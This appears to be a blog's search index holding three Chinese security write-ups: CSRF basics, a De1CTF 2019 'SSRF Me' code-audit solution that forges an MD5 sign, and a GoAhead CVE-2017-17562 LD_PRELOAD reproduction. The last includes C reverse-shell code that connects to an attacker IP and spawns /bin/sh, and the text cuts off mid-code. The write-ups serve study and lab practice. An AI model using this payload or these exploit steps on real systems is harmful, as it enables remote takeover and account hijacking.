<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSRF跨站请求伪造</title>
    <url>/2022/04/22/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
    <content><![CDATA[<h1 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h1><p>原理：通过携带用户在其他页面的cookie值或其他特征 盗用用户身份 达到自己的目的</p>
<p><img src="https://s2.loli.net/2022/04/22/OzgRcBGUqe8Z7QT.png" alt="image-20220422190126603"></p>
<p><a href="https://www.jianshu.com/p/7f33f9c7997b">浅谈CSRF - 简书 (jianshu.com)</a></p>
<p>举个例子 </p>
<p>我在页面A 有一个可以修改password的功能 我在页面A的Cookie值没有过期的情况下 去打开了攻击者构造的页面B</p>
<p>如果页面A存在CSRF漏洞 那么此时用户的Cookie值可能就已经可以被携带了 并且攻击者在页面B恶意构造了修改password的内容 那么就会以用户的身份发起一个恶意的请求 达到修改password的目的</p>
<p>可以在burp中自动生成一段攻击代码 其实就是生成了一段将值隐藏起来 并且写死的表单 改表单可以向目标网页发送一个修改表单的请求</p>
<h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>为了防止CSRF漏洞的发生 网页A在进行一些敏感操作时可能会设定一串特殊的token值 来验证是否是可信任的用户</p>
<p>但这里要区分一下Cookie Session 和 Token  首先Cookie是储存在网页中的一段特征值 用来验证用户身份 而Session则是储存在服务端 而Token则是可以储存在任何位置的一段特征值 通过后端验证Token是否匹配 来进行身份验证</p>
<p>如果网页A对token的验证机制不完善 并且储存在了包文中 那么通过拦包的方式就可以拦截这串Token值 从而冒充了用户的身份</p>
]]></content>
      <categories>
        <category>分类1</category>
        <category>分类2</category>
      </categories>
      <tags>
        <tag>标签1</tag>
        <tag>标签2</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF 2019 SSRF Me</title>
    <url>/2022/07/19/De1CTF-2019-SSRF-Me/</url>
    <content><![CDATA[<h1 id="e-De1CTF-2019-SSRF-Me"><a href="#e-De1CTF-2019-SSRF-Me" class="headerlink" title="e[De1CTF 2019]SSRF Me"></a>e[De1CTF 2019]SSRF Me</h1><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>题目打开给了源码 就是这个源码比较阴间 去百度上拿了一份别的师傅整理好的 还贴心的写了一些注释</p>
<figure class="highlight python"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):  <span class="comment"># python得构造方法</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">not</span> os.path.exists(self.sandbox)):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):  <span class="comment"># 定义的命令执行函数，此处调用了scan这个自定义的函数</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="comment"># md5(secert_key + self.action + self.param).hexdigest() == self.sign</span></span><br><span class="line">            <span class="comment"># md5(secert_key + self.action + self.param).hexdigest() == hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:  <span class="comment"># action要写scan</span></span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)  <span class="comment"># 此处是文件读取得注入点</span></span><br><span class="line">                <span class="comment"># resp = urllib.urlopen(param).read()</span></span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp  <span class="comment"># 输出结果</span></span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:  <span class="comment"># action要加read</span></span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):  <span class="comment"># !!!校验</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="comment"># md5(secert_key + param + action).hexdigest()</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span><span class="comment"># !!!这个路由用于测试</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment"># hashlib.md5(secert_key + param + action).hexdigest()</span></span><br><span class="line"><span class="comment"># hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span><span class="comment"># 这个路由是我们的最终注入点</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> (waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)  </span><span class="comment"># 根目录路由，就是显示源代码得地方</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):  <span class="comment"># 这是用来扫目录得函数</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):  <span class="comment"># !!!这个应该是本题关键点,此处注意顺序先是param后是action</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):  <span class="comment"># 这个waf比较没用好像</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到先是声明了一个Task类 所以先从这个类的实例化开始审计</p>
<figure class="highlight python"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span><span class="comment"># 这个路由是我们的最终注入点</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> (waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure>

<p>这里给出了<code>/De1ta</code>路由 并且在该路由下可以进行传参 这里对<code>param</code>进行传值时 发现要进行绕过<code>waf </code>追溯<code>waf</code></p>
<figure class="highlight python"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):  <span class="comment"># 这个waf比较没用好像</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>这个waf就是给gopher和file协议ban掉了 </p>
<p>回到上面代码 最后返回的是<code>json.dumps(task.Exec()) </code> 这里可以通过控制param的值来读取flag 再追溯Exec</p>
<figure class="highlight python"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):  <span class="comment"># 定义的命令执行函数，此处调用了scan这个自定义的函数</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="comment"># md5(secert_key + self.action + self.param).hexdigest() == self.sign</span></span><br><span class="line">        <span class="comment"># md5(secert_key + self.action + self.param).hexdigest() == hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:  <span class="comment"># action要写scan</span></span><br><span class="line">            tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            resp = scan(self.param)  <span class="comment"># 此处通过控制param为flag.txt把flag写入到result.txt中</span></span><br><span class="line">            <span class="comment"># resp = urllib.urlopen(param).read()</span></span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> resp  <span class="comment"># 输出结果</span></span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:  <span class="comment"># action要加read</span></span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p>开始绕过Exec里面的if</p>
<p>第一层 <strong>if (self.checkSign())</strong></p>
<p>追溯<code>checkSign</code></p>
<figure class="highlight python"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):  <span class="comment"># !!!校验</span></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">       <span class="comment"># md5(secert_key + param + action).hexdigest()</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>追溯<code>getSign</code></p>
<figure class="highlight python"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):  <span class="comment"># !!!这个应该是本题关键点,此处注意顺序先是param后是action</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>

<p>所以要绕过第一层if 就要使<code>hashlib.md5(secert_key + param + action).hexdigest()==self.sign</code>成立 <code>param action sign</code>是我们可控的 就差一个<code>secert_key</code></p>
<figure class="highlight python"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br></pre></td></tr></table></figure>

<p>这里发现<code>secert_key</code>是随机生成的16bytes字符 因为生成的key只有在服务端可见 所以没办法搞到手 先跳过<br>回到可控点</p>
<figure class="highlight python"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):  <span class="comment"># 定义的命令执行函数，此处调用了scan这个自定义的函数</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="comment"># md5(secert_key + self.action + self.param).hexdigest() == self.sign</span></span><br><span class="line">        <span class="comment"># md5(secert_key + self.action + self.param).hexdigest() == hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:  <span class="comment"># action要写scan</span></span><br><span class="line">            tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            resp = scan(self.param)  <span class="comment"># 此处通过控制param为flag.txt把flag写入到result.txt中</span></span><br><span class="line">            <span class="comment"># resp = urllib.urlopen(param).read()</span></span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> resp  <span class="comment"># 输出结果</span></span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:  <span class="comment"># action要加read</span></span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p>接着看下面的if 绕过需要让action中有scan和read 所以在<code>/De1ta</code>路由下（因为是在该路由的函数中调用了Exec函数）要使</p>
<p><code>hashlib.md5(secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;).hexdigest() == self.sign</code></p>
<p>成立 这里sign要通过cookie传值  原因在实例化的代码中声明了</p>
<p>接着通过另外一个路由获取<code>secert_key的值</code></p>
<figure class="highlight python"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span><span class="comment"># !!!这个路由用于测试</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment"># hashlib.md5(secert_key + param + action).hexdigest()</span></span><br><span class="line"><span class="comment"># hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span></span><br></pre></td></tr></table></figure>

<p>这里把action写死了 就是scan 可控的只有param 我们想从这个路由获取到<code>secert_key</code> 所以这里<code>hashlib.md5()</code>参数构造应该与<code>/De1ta</code>路由最终注入的payload是相同的（这里有点绕 慢慢理解一下） </p>
<p>由于这个路由已经把action的值写死了 所以可以通过控制param参数使payload相同</p>
<figure class="highlight plaintext"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span><br></pre></td></tr></table></figure>

<p><code>/De1ta</code>路由的payload是<code>hashlib.md5(secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;).hexdigest() == self.sign</code></p>
<p>所以这里让param为<code>flag.txtread</code> 这样就一样了 返回的md5值就是在<code>/De1ta</code>路由里sign的值</p>
<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207191644577.png" alt="image-20220719164423474"></p>
<p>sign的md5值为<code>4fa2fa4ee3ffeb8495c238dafe1a3c5f</code></p>
<p>去<code>/De1ta</code>路由进行注入</p>
<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207191650026.png" alt="image-20220719165027949"></p>
<p> 这道题主要考的python的代码审计 好像和ssrf没什么关系？？？ 也是第一次做python的题 路还长继续加油吧！</p>
]]></content>
      <categories>
        <category>网安</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Goahead环境变量注入</title>
    <url>/2022/06/30/Goahead%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="Goahead环境变量注入"><a href="#Goahead环境变量注入" class="headerlink" title="Goahead环境变量注入"></a>Goahead环境变量注入</h1><h2 id="CVE-2017-17562"><a href="#CVE-2017-17562" class="headerlink" title="CVE-2017-17562"></a>CVE-2017-17562</h2><h2 id="Goahead"><a href="#Goahead" class="headerlink" title="Goahead"></a>Goahead</h2><p>GoAhead Web Server，它是一个开源（商业许可）、简单、轻巧、功能强大、可以在多个平台运行的嵌入式Web Server。</p>
<p>GoAhead Web Server是跨平台的服务器软件，可以稳定地运行在Windows，Linux和Mac OS X操作系统之上。GoAhead Web Server是开放源代码的，这意味着你可以随意修改Web服务器的功能。这款WEB服务器非常小巧，它的WIN CE版本编译后的大小还不到60k，它的输出通常也是面向一些小屏幕设备。在性能方面，使用一颗24MH z的68040处理器，它的响应速度为20次/秒，使用266MHz的Pentium处理器可以达到50次/秒的响应速度。</p>
<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p><strong>GoAhead Web Server &lt; 3.6.5</strong></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这个漏洞出现在goahead/src/cgi.c:cgihandler函数中 它使用http请求参数中的键值对来初始化新进程的envp参数（也就是会将http请求中的键值存入环境变量中） 在CVE-2017-17562中 考虑到了可能由于环境变量可控造成的注入 因此对“REMOTE_HOST”和“HTTP_AUTHORIZATION”两个环境变量进行了验证 但是没有对其他环境变量做出防范  所以可以利用LD_PRELOAD在cgi程序开始时 将恶意文件的路径指定为LD_PRELOAD的路径 从而达到在运行程序时 恶意文件中的代码被执行造成的rce 具体分析移步下面</p>
<p><a href="https://paper.seebug.org/488/">GoAhead远程代码执行漏洞(CVE-2017-17562)分析及实战 (seebug.org)</a></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里用vulhub进行复现</p>
<p><img src="https://s2.loli.net/2022/06/28/EfnL6kd3swuKtgl.png" alt="image-20220628134529914"></p>
<p>容器内有一个可以利用的文件 该文件可以触发cgi进程</p>
<p><img src="https://s2.loli.net/2022/06/28/NuDLFrXKzJdax6q.png" alt="image-20220628134625382"></p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">curl http://192.168.156.128:8080/cgi-bin/index</span><br></pre></td></tr></table></figure>

<p>测试cgi页面是否能访问</p>
<p>写一个exp.c文件</p>
<figure class="highlight c"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *server_ip=<span class="string">&quot;攻击机ip&quot;</span>;</span><br><span class="line"><span class="type">uint32_t</span> server_port=攻击机监听端口;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">reverse_shell</span><span class="params">(<span class="type">void</span>)</span> __<span class="title function_">attribute__</span><span class="params">((constructor))</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">reverse_shell</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//socket initialize</span></span><br><span class="line">  <span class="type">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  attacker_addr.sin_family = AF_INET;</span><br><span class="line">  attacker_addr.sin_port = htons(server_port);</span><br><span class="line">  attacker_addr.sin_addr.s_addr = inet_addr(server_ip);</span><br><span class="line">  <span class="comment">//connect to the server</span></span><br><span class="line">  <span class="keyword">if</span>(connect(sock, (<span class="keyword">struct</span> sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="comment">//dup the socket to stdin, stdout and stderr</span></span><br><span class="line">  dup2(sock, <span class="number">0</span>);</span><br><span class="line">  dup2(sock, <span class="number">1</span>);</span><br><span class="line">  dup2(sock, <span class="number">2</span>);</span><br><span class="line">  <span class="comment">//execute /bin/sh to get a shell</span></span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>, <span 